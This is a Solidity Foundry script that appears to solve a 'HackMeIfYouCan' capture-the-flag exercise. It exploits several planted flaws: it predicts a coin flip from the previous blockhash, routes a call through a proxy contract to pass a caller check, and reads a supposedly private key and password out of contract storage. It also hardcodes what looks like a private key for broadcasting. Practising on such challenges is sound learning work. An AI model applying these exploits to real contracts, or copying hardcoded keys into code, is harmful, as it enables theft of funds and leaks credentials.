// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import "../src/HackMeIfYouCan.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AddPointProxy {
    HackMeIfYouCan public hackMeIfYouCan;

    constructor(address payable _hackMeIfYouCan) {
        hackMeIfYouCan = HackMeIfYouCan(_hackMeIfYouCan);
    }

    function callAddPoint() public {
        hackMeIfYouCan.addPoint();
    }
}

contract HackMeIfYouCanSolution is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    address user = 0x4F472991794c32aac39533d673e0669bE70a80cf;
    uint256 constant FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;

    function run() external {
        // Init contract with CA
        hackMeIfYouCan = HackMeIfYouCan(
            0x9D29D33d4329640e96cC259E141838EB3EB2f1d9
        );

        vm.startBroadcast(
            0xd292fc320144aef5e067c6c2edff18384c6c4d1d7b7b74d091218160b24e250b
        ); // Utiliser l'adresse de l'utilisateur pour toutes les transactions suivantes

        // Exploit contribute function
        hackMeIfYouCan.contribute{value: 0.0005 ether}();
        console.log("Owner address: ", hackMeIfYouCan.owner());
        console.log("New contribution: ", hackMeIfYouCan.getContribution());

        // Exploit flip function
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool flipResult = hackMeIfYouCan.flip(side);
        console.log("Flip result: ", flipResult);

        // // Exploit getMarks function
        console.log("Marks: ", hackMeIfYouCan.getMarks(user));

        // // Exploit getConsecutiveWins function
        console.log(
            "Consecutive wins: ",
            hackMeIfYouCan.getConsecutiveWins(user)
        );

        // // Exploit addPoint function
        AddPointProxy proxy = new AddPointProxy(address(hackMeIfYouCan));
        proxy.callAddPoint();
        uint256 marksAfterAddPoint = hackMeIfYouCan.getMarks(
            0x4F472991794c32aac39533d673e0669bE70a80cf
        );
        console.log("Marks after addPoint for user: ", marksAfterAddPoint);

        // // Exploit transfer function
        hackMeIfYouCan.transfer(0x4F472991794c32aac39533d673e0669bE70a80cf, 1); // Transférer 1 token à l'adresse de destination
        uint256 marksAfterTransfer = hackMeIfYouCan.getMarks(
            0x4F472991794c32aac39533d673e0669bE70a80cf
        );
        console.log("Marks after transfer for user: ", marksAfterTransfer);

        console.log(
            "Marks: ",
            hackMeIfYouCan.getMarks(0x4F472991794c32aac39533d673e0669bE70a80cf)
        );

        // Exploit sendKey function
        bytes32 key = vm.load(address(hackMeIfYouCan), bytes32(uint256(16)));

        hackMeIfYouCan.sendKey(bytes16(key));
        uint256 marksAfterSendKey = hackMeIfYouCan.getMarks(
            0x4F472991794c32aac39533d673e0669bE70a80cf
        );
        console.log("Marks after sendKey for user: ", marksAfterSendKey);

        // Exploit receive function
        (bool success, ) = address(hackMeIfYouCan).call{value: 0.001 ether}("");
        require(success, "Transfer failed");
        uint256 marksAfterReceive = hackMeIfYouCan.getMarks(user);
        console.log("Marks after receive for user: ", marksAfterReceive);

        // Exploit sendPassword function

        bytes32 password = vm.load(
            address(hackMeIfYouCan),
            bytes32(uint256(3))
        );
        console.log("password");
        console.logBytes32(password);

        hackMeIfYouCan.sendPassword(bytes32(password));
        uint256 marksAfterSendPassword = hackMeIfYouCan.getMarks(
            0x4F472991794c32aac39533d673e0669bE70a80cf
        );

        console.log(
            "Marks after sendPassword for user: ",
            marksAfterSendPassword
        );
        vm.stopBroadcast();
    }

    receive() external payable {}
}
